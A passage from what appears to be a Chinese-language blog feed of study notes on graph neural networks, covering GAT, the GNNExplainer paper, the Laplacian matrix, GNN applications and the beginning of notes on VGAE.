id="三-gat图注意力神经网络"><strong>三、GAT（图注意力神经网络）</strong></h2><p>相比于普通GNN，GAT引入了<strong>注意力机制和非线性特征转换</strong>，使得网络更加<strong>灵活和可解释</strong>，能够更好地捕捉节点之间的关系，并且具有更好的<strong>泛化能力和表达能力</strong>。这些特点使得GAT在很多应用中都能取得较好的表现，例如推荐系统、社交网络分析、图像分类和语音识别等领域。其特点具体如下：</p><ol><li>细粒度的节点注意力：与GNN只考虑节点的局部信息不同，GAT引入了基于注意力机制的节点表示方法，通过学习每个节点之间的权重，使得每个节点都能够更好地捕捉周围节点的信息。</li><li>多头注意力机制：GAT引入了多头注意力机制，可以让不同的头关注不同的节点和边，从而提高了网络的泛化能力和表达能力。</li><li>每层特征重用：在GAT中，每一层的特征都能够被下一层的注意力机制所重用，从而增强了模型的表达能力和稳定性。</li><li>非线性特征转换：GAT在每个注意力机制之前引入了非线性的特征转换，从而使得网络更好地适应不同的数据分布和特征表达。</li></ol><hr><p>在实际实现中，我们通常将特征转换函数、注意力函数和聚合函数定义为可训练的参数，使用梯度下降算法来优化参数。同时，为了提高模型的泛化能力，我们可以使用正则化方法，如Dropout等。</p><ol><li>定义特征转换函数：对于每个节点的特征，我们需要将其转换为一个低维度的向量表示。可以采用线性变换（即矩阵乘法）或者多层感知器（MLP）来进行特征转换。</li><li>定义注意力函数：注意力函数是GAT的核心，它根据节点之间的关系和特征权重计算出节点之间的相对重要性，从而为节点分配不同的权重。注意力函数可以采用单头或者多头注意力机制，其中每个头都有自己的特征转换函数和权重矩阵。</li><li>定义聚合函数：聚合函数用于将周围节点的信息汇总到当前节点的表示中，常用的聚合函数有加和、平均值和最大值等。</li><li>定义输出层：将聚合函数得到的节点表示输入到输出层，常用的输出层包括全连接层和Softmax层等。</li></ol><p>需要注意的是，GAT适用于处理稠密图，因此在使用GAT时需要<strong>将稀疏的邻接矩阵转化为稠密矩阵</strong>，这可以使用基于邻接矩阵的度矩阵和归一化矩阵来实现。</p><hr><p>图注意力神经网络在处理图数据方面具有明显的优势，尤其在<strong>入侵检测系统</strong>中应用能够更好地<strong>捕捉网络流的时间演化特征和异常事件</strong>，提高网络的检测准确率和效率。</p><p>GAT采用自适应的注意力机制来为每个节点分配不同的权重，可以针对每个节点选择最有用的邻居节点来传递信息。这种注意力机制能够充分利用图数据中的信息，从而更加准确地捕捉网络中的时间和空间演化特征。</p><p>由于GAT使用邻接矩阵的度矩阵和归一化矩阵来处理稀疏矩阵，因此可以处理不同规模和稀疏性的图数据。这使得GAT在处理大规模网络数据时具有较高的效率和准确性。</p><p>能够学习到节点之间的交互关系：GAT中的注意力机制能够从节点的特征和其邻居节点的关系中学习到节点之间的交互关系。这有助于更好地捕捉网络中的演化特征和异常事件。</p><p>GAT支持多头注意力机制，可以在不同的注意力头之间共享节点表示。这有助于提高模型的泛化能力和学习能力，并能够更好地捕捉网络中的复杂关系。</p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GNNExplainer</title>
      <link href="/2023/10/10/AILearning/GNN/GNNExplainer/"/>
      <url>/2023/10/10/AILearning/GNN/GNNExplainer/</url>
      
        <content type="html"><![CDATA[<h2 id="gnnexplainer-generating-explanations-for-graph-neural-networks">GNNExplainer: Generating Explanations for Graph Neural Networks</h2><h2 id="1-contribution-本文贡献">1. Contribution 本文贡献</h2><ul><li>提出第一款通用，模型无关的(model-agnostic)对于GNN模型的解释器<strong>GNNEXPLAINER</strong></li><li>形式化描述<strong>GNNEXPLAINER</strong>为最大化互信息的优化任务</li><li>抽取重要的子图结构及节点特征子集，作为模型解释。</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241750221.png" alt="image-20231211103857083"></p><h2 id="2-background-背景信息">2. Background 背景信息</h2><p>对于非图结构的神经网络，解释方法主要有如下两个方向：</p><p>1.为整个网络构建简单的代替模型</p><p>常为模型无关的(model-agnostic)，在待解释样本点的局部建立可信的估计。</p><p>E.g., 线性模型如<em>LIME</em>，规则集合如<em>ANN_DT</em></p><p>2.识别模型计算过程中的重要层面</p><p>E.g. 关注特征梯度(feature gradients)等。</p><p>对于图神经网络设计解释方法，除去节点特征外，还需要结合考虑<strong>图的结构特征</strong>。</p><h2 id="3-problem-formulation-问题定义">3. Problem Formulation 问题定义</h2><h3 id="31-gnn回顾">3.1 GNN回顾</h3><p>抽象GNN基本操作如下：</p><p>给定GNN模型 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Φ</mi></mrow><annotation encoding="application/x-tex">\Phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Φ</span></span></span></span> , 对于 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span> 层节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span>的特征表达求取，共经过如下3步。</p><ol><li><p>与其邻居节点进行信息传递：</p><p><img src="imgs/image-20231211113756040.png" alt="image-20231211113756040"></p></li><li><p>聚合邻居节点信息：</p></li></ol><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>M</mi><mi>i</mi><mi>l</mi></msubsup><mo>=</mo><mi mathvariant="normal">AGG</mi><mo>⁡</mo><mo stretchy="false">(</mo><mrow><msubsup><mi>m</mi><mrow><mi>i</mi><mi>j</mi></mrow><mi>l</mi></msubsup><mi mathvariant="normal">∣</mi><msub><mi>v</mi><mi>j</mi></msub><mo>∈</mo><mi mathvariant="script">N</mi><mo>∗</mo><mrow><mi>v</mi><mo>∗</mo><mi>i</mi></mrow></mrow><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M_{i}^{l}=\operatorname{AGG} ( {m_{i j}^{l} | v_{j} \in \mathcal{N}*{v*{i}}})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.107772em;vertical-align:-0.258664em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.394772em;"></span><span class="mop"><span class="mord mathrm">A</span><span class="mord mathrm">G</span><span class="mord mathrm">G</span></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14736em;">N</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">i</span></span></span></span><span class="mclose">)</span></span></span></span></p><ol start="3"><li>结合自身节点上层表达，生成本层节点表达</li></ol><h3 id="32-gnnexplainer-problem-formulation">3.2 GNNEXPLAINER: Problem formulation</h3><h2 id="摘要"><strong>摘要</strong></h2><p>三段话总结 gnn-explainer 做了什么。</p><ul><li>背景是：针对<strong>同质图</strong>的可解释性操作，和GNN模型结构无关，主要是分析 <strong>node feature 和节点信息聚合过程链路</strong>对模型预测的影响。模型支持单点解释和群体解释。</li><li>模型的输入输出：以节点预测为例，单点解释也就是输入一个node，返回预测该node任务中贡献最大的子图+子图中节点特征，也就是可解释性输出的内容。群体解释就是输入一类节点，同样还是返回可解释性输出的内容。模型优化函数：优化整个 graph 的预测结果和 subgraph 的预测差，找到预测差最大的subgraph，即是解释出来的重要子图。</li><li>评估：最终在合成数据集/真实数据集上进行评估，这里的评估方式是通过挖掘出和groundtruth类似的子图结构用于计算准确率。</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241746183.png" alt="img"></p><p>举个实例，上图这个<strong>同质图分类任务</strong>，如果预测的人群类别是左图左上的篮球，那么GNN-explainer会抓出对打篮球这个预测结果贡献度最高的红色子图，也就是红色标明的球类运动，诸如排球/足球等；如果预测的人群类别是左图右下的航行，GNN-explainer会抓出对航行这个预测结果贡献度最高的绿色子图，也就是绿色标明的海边运动，诸如皮划艇/沙滩排球等。</p><h2 id="问题定义">问题定义</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241747285.png" alt="image-20240424174740235"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241746108.png" alt="img"></p><h2 id="gnnexplainer">GNNExplainer</h2><h3 id="单例解释">单例解释</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241747653.png" alt="image-20240424174701585"></p><blockquote><p>后续还可以根据预测任务的不同类别，修改为条件期望</p></blockquote><h3 id="结合节点特征的单例解释">结合节点特征的单例解释</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241747863.png" alt="image-20240424174721821"></p><h3 id="单类群体解释">单类群体解释</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241748597.png" alt="image-20240424174816564"></p><h2 id="实验结果分析">实验结果分析</h2><blockquote><p>所有论文的实验过程和结果分析还是非常值得一看的，毕竟这是吹牛逼的核心区域，也是用来检验吹的好不好的唯一标准。 - 鲁迅</p></blockquote><p>图可解释的方向，如何量化可解释性的效果是一个大难题。</p><p>本篇作为图可解释性的开篇之作，使用的评估方式是在<strong>合成数据集和真实数据集上，和attention类/grad梯度类的解释工作对比解释的子图结构的准确率。</strong></p><p>终于到了讲解封面图的时候了！！！！！</p><p>如下图的合成数据集上，这里主要对比的是子图的结构，直接看下面A|B的实例说明，可以看到最右边的groundtruth给出的图结构中，仅有本篇论文做到了结构的完全解释，而grad/att得方法都是不全甚至完全不同结构的，自然得到的准确率非常低。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241746130.png" alt="img"></p><p>在真实数据集上，就没有量化指标惹，只能直接看实例，可以看到和合成数据集类似，本方法把groundtruth得结构都完整顺利得识别出来了。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241746138.webp" alt="img"></p><p>在节点特征维度实例分析来看，可以看到att方法没有给出对应的节点特征维度，本篇方法同样是最佳的。同样，这里没有给出量化指标说明。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241746140.png" alt="img"></p><h2 id="结论与延伸">结论与延伸</h2><p>作为开篇之作还是提供了非常完善的可解释性思路，并且拥有扩展性可以复用到不同的图任务图结构上。</p><p>可以改进的点粗略看下来有几条：</p><ul><li>首先，全篇看下来应该是在同质图上的可解释性方法，可以转化到异质图上尝试效果。</li><li>其次，优化函数仅考虑到了结构的差异，可以尝试引入 attention 结构进行辅助优化。</li><li>最后，评估部分有缺陷，目前只在合成数据集上给出了量化指标，且评估方式仅是通过比较结构的相似性。</li></ul>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拉普拉斯矩阵</title>
      <link href="/2023/10/10/AILearning/GNN/Laplace/"/>
      <url>/2023/10/10/AILearning/GNN/Laplace/</url>
      
        <content type="html"><![CDATA[<h3 id="解读laplace矩阵">解读Laplace矩阵</h3><ol><li><p>什么是Laplace矩阵？</p><p>“拉普拉斯矩阵(Laplacian matrix) 也叫做导纳矩阵、基尔霍夫矩阵或离散拉普拉斯算子，主要应用在图论中，作为一个图的矩阵表示。”</p></li><li><p>常见的Laplace矩阵<br>Reference</p></li><li><p>什么是Laplace矩阵？<br>拉普拉斯矩阵(Laplacian matrix) 也叫做导纳矩阵，这次笔记主要是记录下GCN学习时的注意点，在图论（Graph theory）中，对于图 G=(V,E)：</p><pre><code>Laplacian 矩阵的定义为 L = D - A （其中 L 是Laplacian 矩阵， D=diag(d)是对角矩阵，d=rowSum(A)，对角线上元素依次为各个顶点的度， A 则是图的邻接矩阵）</code></pre></li></ol><p>若只考虑无向图，那么L就是对称矩阵。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241729213.png" alt="在这里插入图片描述"></p><p>对于无向图的Laplace矩阵，它有哪些性质？</p><p>半正定矩阵（特征值非负，且是对称矩阵）；<br>对称矩阵（一定有n个线性无关的特征向量）；<br>对称矩阵的不同特征值对应的特征向量相互正交，这些正交的特征向量构成的矩阵为正交矩阵；<br>由于是半正定矩阵，所以是对称阵，那么能特征值分解（EVD）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241729218.png" alt="img"></p><p>由于 U 是正交矩阵，即UUT=I，所以特征值分解又可以写成：<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241729217.png" alt="在这里插入图片描述"></p><h3 id="常见的laplace矩阵">常见的Laplace矩阵</h3><p>2.1 一般形式</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241729221.png" alt="L= D - A"></p><p>2.2 对称归一化形式</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241729222.png" alt="在这里插入图片描述"></p><p>2.3 随机游走归一化形式</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241729224.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图神经网络</title>
      <link href="/2023/10/10/AILearning/GNN/%E4%BB%80%E4%B9%88%E6%98%AF%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
      <url>/2023/10/10/AILearning/GNN/%E4%BB%80%E4%B9%88%E6%98%AF%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="1-什么是图神经网络">1 什么是图神经网络</h2><p>图神经网络（Graph Neu做ral Networks, GNNs）是一种基于图结构的深度学习方法，从其定义中可以看出图神经网络主要由两部分组成，即“图”和“神经网络”。这里的“图”是图论中的图数据结构，“神经网络”是我们熟悉的深度学习NN结构，如MLP，CNN，RNN等。要了解图神经网络我们需要先回顾一下“图”和“神经网络”的基本概念。</p><h3 id="11图的定义">1.1图的定义</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726881.png" alt="image-20210416110800777"></p><h3 id="12典型神经网络">1.2典型神经网络</h3><p>典型的神经网络结构有两条主线，一条主线是卷积神经网络，简称CNN，主要用于图像类数据的处理。另一条主线是循环神经网络，简称RNN，主要用于时序类数据的处理。由于神经网络结构的介绍不是本篇的重点，因此在这里不做重点介绍。只展示如下两图典型的CNN和RNN的结构：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726886.png" alt="img"></p><p>下图展示了当前的主流神经网络结构以及适用的场景：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726887.png" alt="img"></p><h3 id="13-图神经网络">1.3 图神经网络</h3><p>根据上述对图和神经网络的回顾，我们可以看出，图神经网络就是借助神经网络的“能力”如深度特征抽取等来处理图结构的数据，因此对于图神经网络，其直观的结构应该如下图：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726892.png" alt="img"></p><p>其中图结构的数据有许多，如社交网络图、交通路线图、人物关系图、分子结构图、计算结网络拓扑图等等。这些数据都可以作为图神经网络的输入。之后经过特定的神经网络结构，如MLP，CNN，RNN等的基于图结构的运算，可以完成对于<strong>图表示的分类，图的节点或边的预测等功能。</strong></p><h2 id="2-为什么需要图神经网络">2 为什么需要图神经网络</h2><p>近年来，深度学习已经彻底改变了许多机器学习任务，从图像分类和视频处理，到语音识别和自然语言理解，这些任务中的数据通常表示在欧几里得空间中。然而，在越来越多的应用程序中，数据是从非欧几里得域生成的，并表示为具有复杂关系和对象之间相互依赖的图形。图数据的复杂性给现有的机器学习算法带来了巨大的挑战。下图左为图像（欧几里得空间），右为图（非欧几里得空间）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726891.png" alt="img"></p><p>传统的神经网络结构如CNN、RNN等都是接受欧几里得空间的数据作为输入，他们无法处理非欧几里得空间的数据结构，比如图和流行结构。因此对于此类数据，图神经网络就更加适合处理。近年来图神经网络的研究热度也不断提升，如下图所示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726898.png" alt="img"></p><h2 id="3-图神经网络典型的应用场景">3 图神经网络典型的应用场景</h2><p>本章节基于图神经网络近年来的一些研究进展，展示一下图神经网络当前典型的应用场景以及一些典型的任务。</p><p>将图结构和节点内容信息作为模型的输入，GNNs的输出可以通过以下机制之一专注于不同的图分析任务:</p><ul><li>Node-level输出用于点回归和分类任务。</li><li>Edge-level输出与边分类和链路预测任务相关。</li><li>Graph-level输出和图分类任务相关，比如图表示。</li></ul><p>下面以典型论文为例介绍几个GNNs的典型任务：</p><h3 id="31图分类">3.1图分类</h3><p>我们知道很多有机物或者化合物的分子结构都是可以用图结构来表示的，比如下图的4-nitroindole，该GNN的作用是训练一个图神经网络，接收一个分子结构来判断该分子结构会不会导致发生突变。在训练的过程中如果有现存的已标注的可导致发生突变的分子结构，我们就可以训练该图神经网络，然后用他来预测一个新的未知的分子会不会导致突变。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726139.png" alt="img"></p><h3 id="32图生成">3.2图生成</h3><p>我们知道在图像和语言的领域里分别有embedding和generation技术，比如常见的图像和语言生成技术，比如动态静态的预训练和词嵌入技术。相应的在图领域，我们也有图的嵌入表示比如graph embedding representation和图的generation技术。比如下图的graphvae，变分图自编码器就是一个图生成模型，其主要是为图中节点找寻合适的 Embedding 向量，并通过 Embedding 向量实现图重构。其中获取到的节点 Embedding 可以用于支撑下游任务。比如在新的分子结构生成发现中可以使用该技术来加快分子发现速度。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726156.png" alt="img"></p><h3 id="33社交网络分析">3.3社交网络分析</h3><p>在社交网络分析中，实体之间的关系往往会是非常重要的特征，图结构就能很好的表示这种关系特征。如下图的社交网络图中，每个实体的关系可以用边来描述，这样在进行实体分类或者关系分类时，利用图数据结构，完成特定任务的标注，就可以训练出一个图神经网络来完成此类任务。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726168.png" alt="img"></p><h3 id="34网络拓扑分析">3.4网络拓扑分析</h3><p>网络的拓扑天然就是图结构的表示，计算机网络中的路由技术就是以图论为基础的算路技术。同时网络中每两个节点之间也会有时延，丢包，抖动等网络KPI信息。这些点对之间的KPI往往是动态变化的，这就影响到了实时路由决策和优化的问题。比如当前链路的时延或者丢包过大，路由算法就需要选择新的路径进行数据包传递。图神经网络在这个问题中就可以接收底层的网络拓扑、网络配置信息和流量矩阵信息来实时预测每一个点对，每一条流的实验丢包抖动，这样就可以更好的配合路由和优化算法，使能网络的自动驾驶。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726177.png" alt="img"></p><h2 id="4-图神经网络典型训练框架">4 图神经网络典型训练框架</h2><h3 id="41semi-supervised-learning-for-node-level-classification">4.1Semi-supervised learning for node-level classification：</h3><p>给定一个网络，其中部分节点被标记，其他节点未标记，ConvGNNs可以学习一个鲁棒模型，有效地识别未标记节点的类标签。为此，可以通过叠加一对图卷积层，然后是用于多类分类的softmax层来构建端到端框架。见图(a)</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726187.png" alt="img"></p><h3 id="42supervised-learning-for-graph-level-classification">4.2Supervised learning for graph-level classification：</h3><p><mark>图级分类的目的是预测整个图的类标签</mark>。该任务的端到端学习可以结合图卷积层、图池层和/或readout层来实现。图卷积层负责精确的高级节点表示，图池层则扮演下采样的角色，每次都将每个图粗化成一个子结构。readout层将每个图的节点表示折叠成一个图表示。通过在图表示中应用一个多层感知器和一个softmax层，我们可以建立一个端到端图分类框架。见图(b)</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726198.png" alt="img"></p><h3 id="43unsupervised-learning-for-graph-embedding">4.3Unsupervised learning for graph embedding：</h3><p>当图中没有可用的类标签时，我们可以学习在端到端框架中以完全无监督的方式嵌入图。这些算法以两种方式利用边缘级信息。一种简单的方法是采用自编码器框架，编码器使用图卷积层将图嵌入到潜在表示中，在潜在表示上使用解码器重构图结构。另一种常用的方法是利用负采样方法(negative sampling)，即对图中有链接的部分节点对进行负采样，而对图中有链接的节点对进行正采样。然后应用逻辑回归层对的正负配对进行区分。见图©</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241726364.png" alt="img"></p><p>参考文献<br>[1]. <a href="https://mp.weixin.qq.com/s/PSrgm7frsXIobSrlcoCWxw">https://mp.weixin.qq.com/s/PSrgm7frsXIobSrlcoCWxw</a></p><p>[2]. <a href="http://speech.ee.ntu.edu.tw/~tlkagk/courses/ML2020/GNN.pdf">http://speech.ee.ntu.edu.tw/~tlkagk/courses/ML2020/GNN.pdf</a></p><p>[3]. <a href="https://persagen.com/files/misc/scarselli2009graph.pdf">https://persagen.com/files/misc/scarselli2009graph.pdf</a></p><p>[4]. <a href="https://arxiv.org/pdf/1802.03480.pdf">https://arxiv.org/pdf/1802.03480.pdf</a></p><p>[5]. <a href="https://arxiv.org/abs/1901.00596">https://arxiv.org/abs/1901.00596</a></p><p>[6]. <a href="https://arxiv.org/abs/1910.01508">https://arxiv.org/abs/1910.01508</a></p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VGAE浅入</title>
      <link href="/2023/10/10/AILearning/GNN/VGAE%E6%B5%85%E5%85%A5/"/>
      <url>/2023/10/10/AILearning/GNN/VGAE%E6%B5%85%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="1数学定义">1.数学定义</h2><ul><li>图网络： <img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BG%7D%3D(%5Cnu%2C+%5Cxi)" alt="[公式]"> , 其中节点的数量 <img src="https://www.zhihu.com/equation?tex=N%3D%5Cleft%7C+%5Cnu+%5Cright%7C" alt="[公式]"> 。对于当前的图网络他的邻接矩阵是 <img src="https://www.zhihu.com/equation?tex=A" alt="[公式]"> 。某一个节点的特征用 <img src="https://www.zhihu.com/equation?tex=x_%7Bi%7D" alt="[公式]"> 表示， 矩阵<img src="https://www.zhihu.com/equation?tex=%5Cbm%7BX%7D%5Cin+R%5E%7BN%5Ctimes+D%7D" alt="[公式]"> 是整个图网络的节点特征的矩阵表示。</li><li>随机的潜在变量：某一个随机潜在变量用 <img src="https://www.zhihu.com/equation?tex=z_%7Bi%7D" alt="[公式]"> 表示，矩阵 <img src="https://www.zhihu.com/equation?tex=%5Cbm%7BZ%7D%5Cin+R%5E%7BN%5Ctimes+F%7D" alt="[公式]">表示图网络的所有节点被编码之后的潜在变量。</li></ul><h2 id="2-方法">2. 方法</h2><h3 id="21推断模型其实我觉得叫做编码模型更加合适">2.1推断模型（其实我觉得叫做编码模型更加合适）</h3><p>1）首先用图卷积网络求出每个节点的高斯分布的均值和方差:</p><p><img src="https://www.zhihu.com/equation?tex=%5Cbm%5Cmu%3DGCN_%7B%5Cmu%7D(%5Cbm%7BX%7D%2C+%5Cbm%7BA%7D)" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=log(%5Cbm%5Csigma)%3DGCN_%7B%5Csigma%7D(%5Cbm%7BX%7D%2C+%5Cbm%7BA%7D)" alt="[公式]"></p><p>其中<img src="https://www.zhihu.com/equation?tex=GCN(%5Cbm%7BX%7D%2C+%5Cbm%7BA%7D)%3D%5Cbm%7B%5Ctilde%7BA%7D%7DReLU(%5Cbm%7B%5Ctilde%7BA%7D%7D%5Cbm%7BX%7D%5Cbm%7BW_%7B0%7D%7D)%5Cbm%7BW_%7B1%7D%7D" alt="[公式]"> ，其是一个两层的网络， <img src="https://www.zhihu.com/equation?tex=%5Cbm%7B%5Ctilde%7BA%7D%7D%3D%5Cbm%7BD%7D%5E%7B-1%2F2%7D%5Cbm%7BA%7D%5Cbm%7BD%7D%5E%7B-1%2F2%7D" alt="[公式]"> 是归一化的邻接矩阵。</p><p>2）根据所求得的节点特征编码的均值和方差，我们可以得到推断模型：</p><p><img src="https://www.zhihu.com/equation?tex=q(%5Cbm%7BZ%7D%7C%5Cbm%7BX%7D%2C+%5Cbm%7BA%7D)%3D%5Cprod_%7Bi%3D1%7D%5E%7BN%7D%5Cmathcal%7BN%7D(z_%7Bi%7D%7C%5Cbm%7B%5Cmu_%7Bi%7D%7D%2C+diag(%5Cbm%7B%5Csigma_%7Bi%7D%5E%7B2%7D%7D))" alt="[公式]"> （个人理解，之所以用乘积连接各个不同的分布，旨在求得N个独立的变量的联合分布）</p><p>这样每一个节点都有一个具有特定均值和方差的高斯分布去表示。</p><h3 id="22生成模型">2.2生成模型</h3><p><img src="https://www.zhihu.com/equation?tex=p(%5Cbm%7BA%7D%7C%5Cbm%7BZ%7D)%3D%5Cprod_%7Bi%3D1%7D%5E%7BN%7D%5Cprod_%7Bj%3D1%7D%5E%7BN%7Dp(%5Cbm%7BA%7D_%7Bi%2Cj%7D%7C%5Cbm%7Bz%7D_%7Bi%2C+%5Cbm%7Bz_%7Bj%7D%7D%7D)" alt="[公式]"> , 且 <img src="https://www.zhihu.com/equation?tex=p(%5Cbm%7BA%7D_%7Bi%2Cj%7D%3D1%7C%5Cbm%7Bz%7D_i%2C+%5Cbm%7Bz%7D_j)%3D%5Csigma(%7B%5Cbm%7Bz%7D_i%5E%7B%5Ctop%7D%5Cbm%7Bz%7D_j%7D)" alt="[公式]"> （这里有个问题，当 <img src="https://www.zhihu.com/equation?tex=%5Cbm%7BA%7D_%7Bi%2Cj%7D%5Cne1" alt="[公式]"> 时候 <img src="https://www.zhihu.com/equation?tex=p(%5Ccdot)" alt="[公式]"> 是什么呢？）</p><h3 id="23目标函数">2.3目标函数</h3><p><img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%3D%5Cbegin%7Bmatrix%7D+%5Cunderbrace%7BE_%7Bq(%5Cbm%7BZ%7D%7C%5Cbm%7BX%7D%2C+%5Cbm%7BA%7D)%7D%5B%5Clog+p(%5Cbm%7BA%7D%7C%5Cbm%7BZ%7D)%5D%7D+%5C%E6%9C%9F%E6%9C%9B%E9%A1%B9+%5Cend%7Bmatrix%7D-%5Cbegin%7Bmatrix%7D+%5Cunderbrace%7BKL%5Bq(%5Cbm%7BZ%7D%7C%5Cbm%7BX%7D%2C+%5Cbm%7BA%7D)%7C%7Cp(%5Cbm%7BZ%7D)%5D%7D+%5C%E6%AD%A3%E5%88%99%E5%8C%96%E9%A1%B9+%5Cend%7Bmatrix%7D" alt="[公式]"></p><p>最大化这个<a 